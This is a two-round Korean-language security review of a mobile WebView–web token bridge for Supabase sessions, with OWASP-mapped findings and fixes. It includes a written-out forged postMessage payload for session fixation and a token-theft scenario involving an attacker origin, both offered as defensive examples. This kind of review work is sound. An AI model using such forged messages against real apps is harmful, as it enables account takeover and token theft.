# SPEC-MOBILE-002 토큰 브리지 보안 리뷰 (OWASP)

- 리뷰 유형: Run-phase 보안 follow-up (SPEC R-V2 / OD-5)
- 범위: Native(React Native WebView 셸) ↔ Web(Next.js) 간 JS 브리지를 가로지르는 Supabase access/refresh 토큰
- 방식: REVIEW ONLY (코드 미수정)
- 기준: OWASP Mobile Top 10 (2024), OWASP Top 10 (web)
- 리뷰 날짜: 2026-06-09
- 리뷰어: expert-security

---

## 판정 (Verdict)

**FAIL** — 머지/배포 전 차단 필요.

토큰 캐시 저장(SecureStore-only), 비로깅, postMessage 직렬화, 버전드 스키마 등 다수의 claimed control 은 실제로 잘 구현되어 있다. 그러나 **웹 측 메시지 source 검증 부재(CRITICAL)** 와 **WebView 네비게이션/origin 잠금 부재(CRITICAL)** 라는 두 개의 독립적 토큰 탈취/세션 고정 경로가 존재하며, 추가로 **postMessage targetOrigin 와일드카드(`"*"`) 사용(HIGH)** 이 토큰 유출을 가능하게 한다. 이 세 가지는 "토큰이 JS 브리지를 가로지른다"는 본 SPEC 의 핵심 위협 모델을 정면으로 무력화한다.

claimed control 의 충분성 평가: **부분적으로만 존재하며 불충분하다.**

| Claimed control | 존재? | 충분? |
|---|---|---|
| refresh 토큰 SecureStore-only (AsyncStorage/plaintext 금지) | 예 | 예 (단, accessibility 옵션 미설정 — MEDIUM) |
| origin allowlist (cold-start + resume 양쪽) | 예 (네이티브 주입 측) | **아니오** — 수신 측(웹) source 검증 없음, WebView 가 신뢰 origin 에 머무름을 강제하지 않음 |
| 토큰 비로깅 | 예 | 예 |
| postMessage (raw 보간 아님) | 예 | **아니오** — targetOrigin `"*"` 로 유출 가능 |
| web 브리지 `window.ReactNativeWebView` 가드 | 예 | 부분적 — 가드는 "설치 여부"만 통제, 인바운드 메시지 신뢰성은 통제 못 함 |

---

## 심각도별 요약

| 심각도 | 건수 |
|---|---|
| CRITICAL | 2 |
| HIGH | 2 |
| MEDIUM | 3 |
| LOW | 2 |

---

## CRITICAL 발견

### C-1. 웹 브리지가 인바운드 message 의 source/origin 을 검증하지 않음 (세션 고정 + 토큰 탈취)

- 위치: `apps/web/lib/native-bridge/bridge-client.ts:108-126`
- OWASP: Mobile M4 (Insufficient Input/Output Validation), Mobile M5 (Insecure Communication) / Web A07 (Identification and Authentication Failures, session fixation)

문제:
```ts
const onMessage = (event: MessageEvent): void => {
  if (typeof event.data !== "string") {
    return;
  }
  const message = parseInboundMessage(event.data);   // ← event.origin / event.source 검사 전혀 없음
  ...
  void handleRestoreTokens(bridge, message.payload);  // ← 임의 발신자 토큰으로 setSession
};
window.addEventListener("message", onMessage);
```

`installNativeTokenBridge` 는 WebView 안(`window.ReactNativeWebView` 존재)에서만 설치되지만, 일단 설치되면 **window 에 도달하는 어떤 `message` 이벤트든** 무조건 신뢰한다. `event.origin` 도 `event.source` 도 확인하지 않는다. `parseInboundMessage` 는 스키마(형태)만 검증할 뿐 발신자 정체성은 검증하지 않는다.

악용 시나리오 (세션 고정):
1. 페이지에 로드된 임의의 스크립트(서드파티 분석/광고 SDK, 공급망 침해된 npm 패키지, 또는 동일 페이지 컨텍스트의 XSS)가 `window.postMessage('{"version":1,"type":"session:restore","payload":{"access":"<공격자 토큰>","refresh":"<공격자 refresh>"}}', "*")` 를 실행한다.
2. 브리지가 이를 정상 `session:restore` 로 받아 `supabase.auth.setSession({공격자 토큰})` 을 호출한다.
3. 공격자 계정 세션이 피해자 WebView 에 확립(쿠키 기록)된다. 피해자는 공격자 계정으로 로그인되어 입력 데이터가 공격자에게 귀속된다(세션 고정).
4. setSession 이 성공하면 브리지가 `session:synced` 로 최신 토큰을 네이티브에 회신 → SecureStore 에 공격자 토큰이 영속 저장된다.

악용 시나리오 (토큰 탈취):
- 동일 페이지의 악성 스크립트가 자체 `message` 리스너를 등록해 두면, 네이티브가 정상 주입한 `session:restore` 페이로드(피해자 access/refresh)를 그대로 가로챌 수 있다. `window.postMessage(..., "*")`(C-2 참조)는 모든 리스너에게 브로드캐스트되므로, 동일 document 의 어떤 스크립트도 토큰을 읽는다.

권장 수정:
- `onMessage` 진입에서 발신자 검증을 추가한다. React Native WebView 의 `injectedJavaScript`/`window.postMessage` 경로는 일반적으로 **`event.source === window` 이고 `event.origin === window.location.origin`**(같은 document 내부 post)이다. 단, 같은 document 의 악성 스크립트도 이 조건을 통과하므로 origin 검사만으로는 동일 페이지 위협(서드파티 스크립트/XSS)을 막지 못한다.
- 근본 대책: 네이티브↔웹 사이에 **공유 비밀(nonce/HMAC)** 을 도입한다. 네이티브가 cold-start 시 1회용 nonce 를 안전 채널로 주입하고, 모든 브리지 메시지에 nonce(또는 메시지 HMAC)를 포함시켜 양쪽이 검증한다. 동일 page 의 임의 스크립트는 nonce 를 모르므로 위조/탈취가 불가능하다.
- 차선책(최소): `event.source`/`event.origin` 화이트리스트 + 페이지의 서드파티 스크립트 표면 최소화 + 엄격한 CSP(`script-src 'self'`). 단, 이는 공급망/XSS 위협을 완전히 닫지 못하므로 nonce 방식과 병행 권장.

---

### C-2. WebView 가 신뢰 origin 에 잠겨 있지 않음 — 토큰이 공격자 제어 origin 으로 주입/유출 가능

- 위치: `apps/mobile/components/WebViewShell.tsx:64-87` (WebView 설정), `apps/mobile/App.tsx:36-69` (소유), `apps/mobile/hooks/useAuthBridge.ts:76` (targetOrigin)
- OWASP: Mobile M5 (Insecure Communication), Mobile M8 (Security Misconfiguration)

문제 (복합):

(a) `originWhitelist` 미설정 → 기본값 `["http://*", "https://*"]`. 즉 WebView 는 **모든 http/https origin 을 내부 렌더링**한다. 신뢰 `WEB_URL` 이외의 임의 origin 으로 top-level 네비게이트되어도 WebView 안에서 그대로 로드된다.

(b) `onShouldStartLoadWithRequest`(`useAuthBridge.ts:107-116`)는 **GoTrue authorize URL 인터셉트 전용**이다 — 그 외 모든 URL 은 `return true`(허용)한다. 즉 네비게이션 잠금 장치가 아니다. 게다가 react-native-webview 공식 문서상 **Android 에서는 first load 에 호출되지 않으며**, OAuth 리다이렉트 체인(GoTrue → Google → 콜백)이나 웹 내부 open-redirect 가 신뢰 origin 을 벗어난 페이지로 WebView 를 데려갈 수 있다.

(c) origin allowlist(`isTrustedOrigin`)는 **주입 직전 한 번**만, 그것도 `currentUrlRef`(onNavigationStateChange 로 추적되는 마지막 URL)를 기준으로 검사한다. 주입과 실제 렌더 페이지 사이에 TOCTOU(검사-사용 시점 불일치) 여지가 있고, resume 재주입은 `currentUrlRef` 가 stale 일 수 있다.

(d) 결정타 — `postMessageJs`(`useAuthBridge.ts:74-77`):
```ts
return `window.postMessage(${JSON.stringify(serialized)}, "*"); true;`;
```
`targetOrigin` 이 `"*"`(와일드카드)다. `injectJavaScript` 는 **현재 WebView 가 어떤 origin 에 있든** 실행되며, `"*"` 때문에 그 origin 이 신뢰 origin 인지와 무관하게 토큰 페이로드를 그 페이지의 모든 message 리스너에 전달한다.

악용 시나리오:
1. 사용자가 WebView 내 링크/리다이렉트로 `https://evil.example` 로 네비게이트(originWhitelist 미설정이라 내부 로드됨).
2. 앱이 백그라운드→포그라운드(resume) 전이. `useAppLifecycle` 이 `injectRevalidate(tokens, currentUrlRef.current)` 호출.
3. `currentUrlRef` 가 stale 하게 신뢰 origin 을 가리키거나(TOCTOU), 또는 cold-start 경로에서 `injectJavaScript` 가 evil 페이지에서 실행되면, `targetOrigin "*"` 로 인해 evil 페이지가 피해자 access/refresh 토큰을 수신한다 → 완전한 계정 탈취.

권장 수정:
- `WebViewShell` 에 `originWhitelist={[WEB_URL_ORIGIN]}` 명시 + (Android) `setSupportMultipleWindows={false}` 설정.
- `onShouldStartLoadWithRequest` 를 OAuth 인터셉트뿐 아니라 **네비게이션 화이트리스트 게이트**로 확장: 신뢰 origin(및 OAuth 인터셉트 대상) 외 top-level 네비게이션은 `Linking.openURL` 로 외부 브라우저에 위임하고 WebView 내 로드는 거부.
- `postMessageJs` 의 `targetOrigin "*"` → 신뢰 origin literal 로 교체: `window.postMessage(${JSON.stringify(serialized)}, ${JSON.stringify(WEB_URL_ORIGIN)});`. 이렇게 하면 WebView 가 다른 origin 에 있을 때 브라우저가 메시지 전달을 자체 거부한다.
- (C-1 의 nonce 방식과 결합 시) origin 이탈 상황에서도 토큰 위조/탈취가 차단된다.

---

## HIGH 발견

### H-1. 네이티브→웹 postMessage 의 targetOrigin 와일드카드 `"*"` (토큰 브로드캐스트)

- 위치: `apps/mobile/hooks/useAuthBridge.ts:76`
- OWASP: Mobile M5 / Web A02 (Cryptographic/Transit exposure 성격)

`window.postMessage(serialized, "*")` 의 두 번째 인자(targetOrigin)가 `"*"` 다. 주석은 "토큰은 문자열 리터럴로만 들어간다(코드 평가 아님)"고 injection 위험만 다루지만, **`"*"` 의 문제는 injection 이 아니라 수신 origin 미제한(유출)** 이다. 같은 document 의 모든 스크립트(서드파티/XSS)가 이 메시지를 수신할 수 있다. C-2(d)와 동일 라인이며, C-2 의 WebView origin 잠금이 없으면 CRITICAL 로 격상되지만, 독립적으로도 동일 페이지 내 토큰 브로드캐스트라는 HIGH 위험이다.

권장 수정: targetOrigin 을 신뢰 `WEB_URL` origin literal 로 고정(C-2 권장과 동일). claimed control "postMessage-not-interpolation" 은 충족하나, postMessage 보안의 핵심인 targetOrigin 제한이 빠져 있어 claimed control 이 **불충분**함을 확인한다.

---

### H-2. 로그아웃 emit 유실 시 stale refresh 토큰 영속 (지속 접근)

- 위치: `apps/web/lib/native-bridge/LogoutBridgeNotifier.tsx:23-29`, `apps/mobile/lib/auth/token-store.ts:70-79`, `apps/mobile/hooks/useAuthBridge.ts:148-151`
- OWASP: Mobile M2 (Inadequate Supply Chain / 여기서는 Insecure Data Storage 잔존), Web A07 (세션 종료 실패)

로그아웃 시 SecureStore 클리어는 **오직 웹이 `/login` mount 에서 `session:cleared` 를 1회 post 하고, 그것이 WebView onMessage 로 도달할 때만** 실행된다(`clearTokens`). 이 단일 채널이 다음 경우 유실되면 stale refresh 토큰이 SecureStore 에 남는다:
- `/login` 도착 전 앱 종료/크래시
- WebView 가 신뢰 origin 이 아닌 페이지에 있어 `notifyNativeSessionCleared` 가 안 불리거나(R-T4 가드는 통과하지만 페이지 미도달), onMessage 가 다른 origin 컨텍스트라 누락
- server redirect 와의 타이밍 경합(SPEC 이 H-2 로 인지하고 /login mount 로 완화했으나, mount 자체가 안 되는 경로는 여전히 노출)

refresh 토큰이 SecureStore 에 잔존하면, 다음 cold-start 에서 `session:restore` 로 재주입되어 setSession 이 (refresh_token_reuse_interval=10s 밖에서도 rotation 미수행이면) 세션을 되살릴 수 있다. 토큰 분실 단말에서 "로그아웃했다고 믿는" 사용자의 세션이 부활하는 지속 접근 위험.

권장 수정:
- 로그아웃을 단일 emit 에 의존하지 말 것. 네이티브 측에서 멱등 보강: cold-start 시 setSession 이 `session:none`(만료/무효)을 회신하면 `clearTokens()` 까지 수행(현재는 저장만 안 할 뿐 기존 토큰 삭제 안 함 — `decideInboundAction` 의 `none` 은 clear 가 아님, `bridge-protocol.ts:172-175`).
- 또는 로그아웃 확정 시 access 토큰 서버 revoke + refresh rotation 강제로 stale refresh 의 재사용 자체를 무력화.

---

## MEDIUM 발견

### M-1. SecureStore accessibility 옵션 미설정 (기본값 의존)

- 위치: `apps/mobile/lib/auth/token-store.ts:53-62` (setItemAsync 호출에 옵션 미전달)
- OWASP: Mobile M9 (Insecure Data Storage) / M2

`SecureStore.setItemAsync(key, value)` 가 `SecureStoreOptions`(특히 `keychainAccessible`) 없이 호출된다. expo-secure-store 기본은 iOS `WHEN_UNLOCKED` 로 합리적이나, **명시되지 않으면 SDK 기본값 변동/플랫폼 차이에 노출**된다. refresh 토큰 같은 장기 비밀은 `WHEN_UNLOCKED_THIS_DEVICE_ONLY`(백업/다른 기기 복원 차단)를 명시적으로 설정하는 것이 OWASP 모바일 저장 권고에 부합한다. claimed control "SecureStore-only" 는 충족하나 저장 강도(accessibility/디바이스 바인딩)는 미명시.

권장: `setItemAsync(key, value, { keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY })`.

### M-2. prod HTTPS 강제 미구현 (env 의존, 평문 전송 가능)

- 위치: `apps/mobile/lib/web-url.ts:23-34`, `apps/mobile/app.json` (ATS/cleartext 정책 미설정)
- OWASP: Mobile M5 (Insecure Communication)

`resolveWebUrl` 은 `EXPO_PUBLIC_WEB_URL` 이 비어있지 않은지만 검사하고 **scheme(http/https)을 검증하지 않는다.** prod 빌드에 실수로 `http://` URL 이 주입되면 토큰이 평문 HTTP 로 전송된다. app.json 에 iOS ATS exception 이나 Android `usesCleartextTraffic` 정책이 보이지 않아(기본은 안전하나) 빌드 구성에 따라 평문이 허용될 수 있다. SPEC R-V2 가 "prod HTTPS 강제"를 요구하나 코드 게이트는 없다.

권장: prod(또는 `__DEV__ === false`)에서 `resolveWebUrl` 이 `https:` scheme 을 강제(localhost dev 예외 허용)하도록 가드 추가.

### M-3. `decideInboundAction` 의 `session:none` 이 기존 토큰을 삭제하지 않음

- 위치: `apps/mobile/lib/auth/bridge-protocol.ts:166-181`
- OWASP: Web A07 (만료/무효 세션 정리 실패)

`session:none`(웹이 만료/무효/예외 폴백으로 회신)을 받으면 `{ kind: "none" }` 로 처리되어 **저장만 안 할 뿐 기존 SecureStore 토큰은 그대로 남는다.** 즉 "refresh 가 만료되어 웹이 none 을 회신"한 상황에서도 stale 토큰이 캐시에 잔존한다(H-2 와 연계). 다음 cold-start 마다 무효 토큰을 재주입하는 무용 반복 + 잔존 비밀.

권장: `none` 수신 시 `clear` 동작도 수행(저장된 토큰이 웹 검증을 통과 못 했으므로 캐시 무효화가 안전).

---

## LOW 발견

### L-1. JWT access token 만료 1시간 (모바일 캐시 컨텍스트에서 다소 길음)

- 위치: `supabase/config.toml:171` (`jwt_expiry = 3600`)
- OWASP: Web A07

access token 1시간은 일반 웹 기준 허용 범위이나, 토큰이 SecureStore 에 캐시되고 브리지를 가로지르는 모바일 컨텍스트에서는 탈취 시 악용 창이 길다. resume 재검증으로 rotation 되긴 하나, 단말 탈취 시나리오에서 더 짧은 access 만료(15-30분)가 OWASP JWT 권고에 부합.

권장: jwt_expiry 단축 검토(15-30분).

### L-2. 브리지 wire 포맷 중복 구현(mobile/web 인라인 등가)로 인한 스키마 드리프트 위험

- 위치: `apps/mobile/lib/auth/bridge-protocol.ts` vs `apps/web/lib/native-bridge/bridge-protocol.ts`
- OWASP: Web A04 (Insecure Design — 검증 로직 분기 위험)

양측이 같은 스키마를 독립 인라인 구현한다. 한쪽만 검증 강화(예: nonce 추가)되고 다른 쪽이 누락되면 보안 검증 비대칭이 생긴다. 직접적 취약점은 아니나, C-1 의 nonce 도입 시 양쪽 동기화가 깨지면 가드 우회가 가능하므로 공유 패키지/계약 테스트로 묶는 것이 안전.

권장: 공유 타입/검증 모듈 또는 cross-package 계약 테스트.

---

## 잘 구현된 점 (claimed control 검증 — 통과)

- **토큰 raw 문자열 보간 없음**: 모든 주입은 `JSON.stringify(serialized)` 로 한 번 더 감싼 postMessage 페이로드로 전달된다(`useAuthBridge.ts:74-77`). 토큰 값이 JS 소스로 평가되는 경로 없음. 인바운드도 `parseBridgeMessage`/`parseInboundMessage` 가 `JSON.parse` 만 사용(eval 없음). injection sink 위협(C-2(d)의 targetOrigin 와는 별개)은 **닫혀 있다.**
- **토큰 비로깅**: 전 파일 grep 결과 토큰/페이로드를 console.* 로 출력하는 경로 없음. catch 분기도 토큰 내용 비노출(`token-store.ts`, `bridge-client.ts`).
- **AsyncStorage/plaintext 미사용**: refresh 토큰은 SecureStore 두 키(`moyura.session.access_token`/`refresh_token`)에만 저장. AsyncStorage import 0.
- **PII 최소화**: 페이로드는 access/refresh 만, userId/프로필 미포함. 스키마/빌더가 이를 구조적으로 강제.
- **버전드/방어적 파싱**: JSON 실패/version 비숫자/unknown type/payload 불완전 모두 throw 없이 null(안전 무시). additive 확장 가능.
- **`window.ReactNativeWebView` 가드**: 일반 브라우저에서 브리지 미설치(no-op) — 순수 웹 무영향.
- **bounded 재시도/타임아웃**: 주입 재시도 상한(MAX_INJECTION_RETRIES=5) + 핸드셰이크 타임아웃(8s)으로 무한 루프/무한 스플래시 방지.

---

## OWASP Mobile Top 10 (2024) 커버리지

| ID | 항목 | 평가 | 관련 발견 |
|---|---|---|---|
| M1 | Improper Credential Usage | 부분 통과 | 토큰을 자격증명으로 적절히 분리(PII 0). H-2(로그아웃 잔존) |
| M2 | Inadequate Supply Chain Security | 미충분 | L-2(중복 구현 드리프트), 서드파티 스크립트 신뢰(C-1) |
| M3 | Insecure Authentication/Authorization | FAIL | **C-1 세션 고정**, H-2 세션 종료 실패 |
| M4 | Insufficient Input/Output Validation | FAIL | **C-1 message source 미검증**, 스키마 검증은 통과 |
| M5 | Insecure Communication | FAIL | **C-2 WebView origin 미잠금**, H-1 targetOrigin `*`, M-2 HTTPS 미강제 |
| M6 | Inadequate Privacy Controls | 통과 | PII 최소화(access/refresh only) |
| M7 | Insufficient Binary Protections | N/A | 본 SPEC 범위 외 |
| M8 | Security Misconfiguration | FAIL | **C-2 originWhitelist/multipleWindows 기본값 의존** |
| M9 | Insecure Data Storage | 부분 통과 | SecureStore-only 통과, M-1 accessibility 미설정, M-3 stale 잔존 |
| M10 | Insufficient Cryptography | 통과 | OS 키체인/Keystore 위임, 자체 암호화 미사용(적절) |

---

## 권장 조치 우선순위

1. (CRITICAL) C-1: 웹 브리지에 메시지 source 검증 + 네이티브↔웹 nonce/HMAC 인증 도입. → expert-frontend(웹) + expert-backend/모바일 담당
2. (CRITICAL) C-2: WebView `originWhitelist` 명시 + 네비게이션 화이트리스트 게이트 + targetOrigin literal 화. → 모바일 담당(expert-frontend/RN)
3. (HIGH) H-1: targetOrigin `"*"` → 신뢰 origin literal (C-2 와 동일 라인).
4. (HIGH) H-2 / (MEDIUM) M-3: `session:none` 시 clearTokens + 로그아웃 멱등 보강.
5. (MEDIUM) M-1: SecureStore `keychainAccessible: WHEN_UNLOCKED_THIS_DEVICE_ONLY`.
6. (MEDIUM) M-2: prod https scheme 가드.
7. (LOW) L-1/L-2: jwt_expiry 단축 검토, 브리지 스키마 공유/계약 테스트.

검증(수정 후):
- C-1/C-2 회귀 테스트: 위조 `session:restore`(임의 origin/source)가 setSession 을 호출하지 않음, evil origin 에서 injectJavaScript 가 토큰을 전달하지 않음.
- expert-testing 과 보안 테스트 케이스 조율, 수정 후 재리뷰 권장.

---

Reviewed: 2026-06-09 · expert-security · REVIEW ONLY (no source modified)

---
---

## Re-review (round 2) — security

- 리뷰 유형: round-1(FAIL) 수정(C-1/C-2/H-1/H-2/M-1/M-3 → R-T8/R-T9/R-R4/R-N2) 적용 후 독립 재검토
- 방식: REVIEW ONLY (코드 미수정). round-1 검토자와 무관한 독립 재검증 — 적대적 관점 유지.
- 기준: OWASP Mobile Top 10 (2024), OWASP Top 10 (web). react-native-webview / Next.js CSP 공식 문서 교차 확인.
- 재리뷰 날짜: 2026-06-09
- 리뷰어: expert-security (round 2)
- 확인 대상 (live source): `nonce-core.ts`, `bridge-protocol.ts`(mobile/web), `token-store.ts`/`token-store-core.ts`, `auth-bridge-core.ts`, `useAuthBridge.ts`, `useAppLifecycle.ts`/`app-lifecycle-core.ts`, `WebViewShell.tsx`, `App.tsx`, `web-url.ts`, `bridge-client.ts`, `NativeBridgeProvider.tsx`, `LogoutBridgeNotifier.tsx`, `login/page.tsx`, `me/page.tsx`, `proxy.ts`, `middleware.ts`, `layout.tsx`, `supabase/config.toml`.

### 신규 판정 (round 2 verdict)

**PASS-WITH-FIXES** — round-1 의 두 CRITICAL(C-1/C-2)·두 HIGH(H-1/H-2)는 적절히 닫혔다. 머지/Run 완료를 막을 새 CRITICAL/HIGH 는 없다. 다만 새로 발견한 **CSP nonce 미작동(MEDIUM, N-1)** — 보강 레이어가 실제로는 hydration 스크립트를 차단하거나 nonce 보호를 무력화할 수 있는 구현 결함 — 과 디바이스 수동 검증 항목(R-T9 Android first-load 한계, M-2 HTTPS 가드)이 남는다. 이들은 nonce+origin-lock 핵심 방어(C-1/C-2)를 무너뜨리지 않으므로 차단 사유는 아니나, N-1 은 Run 내 또는 직후 정리 권장이다.

### round-1 발견 종료 표 (closure table)

| 발견 | 상태 | 증거 (file:line) |
|---|---|---|
| **C-1** 웹 인바운드 메시지 source/auth 미검증 (세션 고정+토큰 탈취) | **CLOSED** | `bridge-client.ts:144-154` — setSession 전 `verifyInboundMessage`(origin + nonce) 강제. `bridge-protocol.ts(web):93-103` — `event.origin === trustedOrigin` AND `constantTimeEquals(nonce)`. nonce 불일치/foreign-origin 은 `handleRestoreTokens` 미호출. 네이티브 대칭: `decideInboundAction`(`bridge-protocol.ts(mobile):216-223`)이 nonce 불일치 시 `ignore`. |
| **C-2** WebView origin 미잠금 + targetOrigin `"*"` | **CLOSED (코드)** / **PARTIAL (플랫폼 한계 문서화 필요)** | `App.tsx:38-39,152` — `originWhitelist=[TRUSTED_ORIGIN]`. `WebViewShell.tsx:85-87` — `originWhitelist` 전달 + `setSupportMultipleWindows={false}`. `useAuthBridge.ts:135-156` + `auth-bridge-core.ts:187-202` — `onShouldStartLoadWithRequest` 가 비신뢰 top-level origin `deny`+`Linking.openURL`. **잔여:** Android first-load 미호출(아래 N-3). |
| **H-1** targetOrigin `"*"` 브로드캐스트 | **CLOSED** | `useAuthBridge.ts:95-99,119,224,242` — `postMessageJs` 가 `buildTargetOrigin(WEB_URL)` origin literal 사용. grep 결과 코드 경로에 `postMessage(..., "*")` 0건(주석/테스트의 "금지" 언급만). 회신측 `bridge-protocol.ts(web)` 의 web→native 는 `ReactNativeWebView.postMessage`(단일 수신자, targetOrigin 무관). |
| **H-2** 로그아웃 emit 유실 → stale refresh 잔존 | **CLOSED** | (a) 멱등 백업: `decideInboundAction` 의 `session:none → {kind:"clear"}`(`bridge-protocol.ts(mobile):231-233`) — 다음 cold-start 마다 무효 세션이면 clear. (b) emit 지점: `LogoutBridgeNotifier`(`login/page.tsx:26`)가 server redirect 완료 후 `/login` mount 에서 1회 emit. 추가로 supabase `enable_refresh_token_rotation=true`(config.toml:177)로 재사용도 제한. |
| **M-1** SecureStore accessibility 미설정 | **CLOSED** | `token-store.ts:26-28,64-65` — `keychainAccessible: WHEN_UNLOCKED_THIS_DEVICE_ONLY` 명시, 모든 `setItemAsync` 에 전달. `ALWAYS` 미사용. |
| **M-3** `session:none` 이 기존 토큰 미삭제 | **CLOSED** | `bridge-protocol.ts(mobile):231-233` — `none → clear`. `useAuthBridge.ts:183-193` — `clear` 액션이 `clearTokens()` 실행. 테스트 `bridge-protocol.security.test.ts:95-107` 가 검증. |
| **M-2** prod HTTPS 강제 미구현 | **NOT-CLOSED (의도적 — follow-up)** | `web-url.ts:23-34` — 여전히 scheme 미검증. SPEC R-V2/Non-Goal 이 "prod HTTPS 강제는 문서화하되 배포는 follow-up" 으로 명시. round-2 에서도 동일 MEDIUM 으로 잔존(아래 재기재). |
| **L-1** jwt_expiry 3600 | **NOT-CLOSED (수용)** | `config.toml:171` `jwt_expiry=3600` 유지. round-1 LOW 권고였고 미반영. rotation 활성으로 완화. |
| **L-2** 브리지 스키마 중복 구현 드리프트 | **PARTIAL** | mobile/web `bridge-protocol.ts` 가 여전히 인라인 등가 중복(특히 `constantTimeEquals` 양쪽 복제 — `bridge-protocol.ts(mobile):192-201` / `(web):70-79`). 다만 nonce 도입이 양쪽 대칭으로 반영됐고 각각 보안 테스트 존재(`*.security.test.ts`). 계약 테스트는 여전히 부재. |

요약: round-1 CRITICAL 2 / HIGH 2 → **CLOSED 4** (C-2 는 코드 CLOSED + 플랫폼 한계 PARTIAL). MEDIUM 3 → CLOSED 2(M-1/M-3), NOT-CLOSED 1(M-2, 의도적 연기). LOW 2 → NOT-CLOSED/PARTIAL(수용 범위).

### nonce 메커니즘의 실제 보안 가치 — 정직한 평가

질문의 핵심(전역 `window.__MOYURA_BRIDGE_NONCE__` 가 비밀이 아니라는 점)을 솔직히 다룬다.

**nonce 단독이 사는 것:**
- nonce 는 cold-start 마다 CSPRNG(WebCrypto)로 생성된 128-bit unguessable 값이고, 신뢰 origin 채널(`injectedJavaScriptBeforeContentLoaded`)로만 페이지에 확립된다(`App.tsx:46-48,154`). **추측(brute-force)으로는 위조 불가** — 동일 page 라도 nonce 를 *읽지 못하는* 코드(예: postMessage 만 보낼 수 있는 격리 컨텍스트, 또는 nonce 확립 전 타이밍의 스크립트)는 `session:restore` 위조나 위조 `session:synced/cleared` 주입이 불가능하다. 이로써 round-1 의 1차 위협(임의 origin 에서 `postMessage(..., "*")` 로 위조 — C-1 시나리오 1, H-1 브로드캐스트 수신)은 닫힌다.

**nonce 가 사지 못하는 것 (정직하게):**
- **같은 page 에서 임의 JS 를 실행할 수 있는 공격자(XSS / 공급망 침해 npm)는 `window.__MOYURA_BRIDGE_NONCE__` 를 읽을 수 있다.** 전역에 평문으로 노출되므로, 그런 공격자는 (1) 유효 nonce 를 실은 위조 메시지를 만들거나, (2) 자체 `message` 리스너로 토큰을 가로채거나, (3) `document.cookie`/supabase 세션을 직접 탈취할 수 있다. **즉 nonce 는 same-page 임의 코드 실행 위협에 대해 비밀이 아니며, 그 위협을 막지 못한다.** 이는 설계의 한계가 아니라 브라우저 보안 모델의 본질이다 — 같은 origin 의 임의 코드는 그 origin 의 모든 것을 본다.
- 따라서 **nonce 의 진짜 가치는 origin-lock + CSP 와 결합했을 때만 성립한다:** WebView 가 신뢰 origin 에 잠겨 있어(R-T9) 공격 스크립트가 그 page 에 *진입*하려면 ① 신뢰 origin 의 XSS, 또는 ② 신뢰 origin 이 로드하는 서드파티 스크립트/공급망 침해뿐이다. CSP(`script-src 'self'`)가 ②의 표면(외부/인라인 스크립트)을 축소한다. nonce 는 그 *위에서* "origin 은 맞지만 nonce 를 모르는" 잔여 케이스(격리 컨텍스트, 타이밍, iframe 등)를 닫는 마지막 레이어다.

**결론(C-1 충분성):** 계층 방어(originWhitelist + onShouldStartLoadWithRequest deny + specific targetOrigin + event.origin 검증 + nonce + CSP)는 round-1 이 식별한 구체적 공격 경로(임의 origin 위조, 와일드카드 브로드캐스트, 비신뢰 page 로의 토큰 주입)를 **충분히 닫는다**. 잔여 위험은 **신뢰 origin 자체의 same-page XSS / 공급망 침해**이며, 이는 (a) 본 SPEC 의 위협 모델(토큰이 *브리지*를 가로지름) 범위를 넘어 웹 앱 전반의 XSS 방어 문제이고, (b) nonce 가 *원리적으로* 닫을 수 없는 표면이다. 이 잔여 위험은 수용 가능하나 **명시적으로 문서화되어야** 한다(현재 OD-11 에 "nonce 단독으로 닫히지 않는 공급망/XSS 표면은 CSP 가 보강" 으로 부분 기재 — 적절). nonce 를 "비밀"로 과신하지 않는 한, 이 설계는 건전하다.

### CSP 건전성 평가

1. **CSP 가 HTML 문서 응답에 부착되는가?** 부분적. `proxy.ts:50` 이 `response.headers.set("Content-Security-Policy", csp)` 로 **응답 헤더**에 부착하고, matcher(`proxy.ts:57`)가 정적 자산을 제외한 모든 경로(페이지 문서 포함)에서 실행되므로 — HTML 문서 응답에 CSP 헤더는 **부착된다**. 여기까지는 OK.

2. **그러나 Next.js 자동 nonce 적용이 실제로 작동하지 않는다 (신규 N-1, MEDIUM).** Next.js 공식 CSP 문서는 nonce 자동 적용 조건을 명시한다: "Next.js parses the **`Content-Security-Policy` header** [present in the **request**] and extracts the nonce using the `'nonce-{value}'` pattern." 공식 proxy 예제는 `requestHeaders.set('Content-Security-Policy', cspHeaderValue)` 를 **요청 헤더에** 설정한다. 그런데 본 구현은 `middleware.ts:33-36` 에서 **요청 헤더에 `x-nonce` 만** 전파하고 `Content-Security-Policy` 는 요청 헤더에 설정하지 않으며, CSP 는 `proxy.ts:50` 에서 **응답 헤더에만** 설정한다. 결과:
   - Next.js 의 프레임워크/hydration 인라인 스크립트가 nonce 를 부여받지 못한다 → **prod 에서 `script-src 'self' 'nonce-...'` (nonce 없는 인라인 부트스트랩 스크립트가 차단)로 인해 앱 자체 hydration 이 깨질 수 있다.** dev 는 `'unsafe-inline'` 이 있어 가려지므로 발견이 늦어진다.
   - 만약 호환을 위해 운영자가 `'unsafe-inline'` 을 prod 에 추가하면(흔한 우회) **nonce 보호가 무의미해진다** — `'unsafe-inline'` + nonce 공존 시 nonce-aware 브라우저는 nonce 를 존중하지만, `'strict-dynamic'` 없는 `'self' 'nonce-...'` 만으로는 여전히 `'self'` 의 외부 스크립트를 허용하므로(공급망 표면 잔존), nonce-readable-global + 느슨한 directive 조합이 exfiltration 을 허용할 여지가 생긴다.
   - 공식 권장 `'strict-dynamic'` 누락(`proxy.ts:29`): `'self' 'nonce-...'` 만 있으면 Next.js 가 동적으로 주입하는 후속 스크립트(chunk)가 nonce/strict-dynamic 전파 없이 차단될 수 있다.
   - 또한 nonce 작동 전제인 **dynamic rendering** 이 명시적으로 강제되지 않았다(`me/page.tsx` 는 `cookies()` 로 사실상 dynamic 이나, `app/page.tsx` 등은 정적일 수 있어 nonce 미주입 가능).
   → **영향:** 이 결함은 *보안을 약화*시키기보다 *CSP 보강 레이어를 사실상 비활성/오작동*시킨다. C-1 의 핵심 방어(nonce+origin 검증)는 CSP 와 독립적으로 동작하므로 C-1 은 여전히 CLOSED 다. 그러나 "CSP 가 same-page 공급망/XSS 표면을 축소한다"는 OD-11 의 보강 주장(nonce 의 잔여 위험을 메우는 레이어)이 현재 구현으로는 **신뢰할 수 없다**. MEDIUM 으로 분류한다.

3. **다른 directive 의 표면 평가:**
   - `style-src 'self' 'unsafe-inline'`(`proxy.ts:34`): 스타일 인라인 허용은 토큰 exfiltration 벡터로는 약하다(CSS exfil 은 제한적). 수용 가능하나 nonce 기반으로 좁힐 여지 있음(LOW).
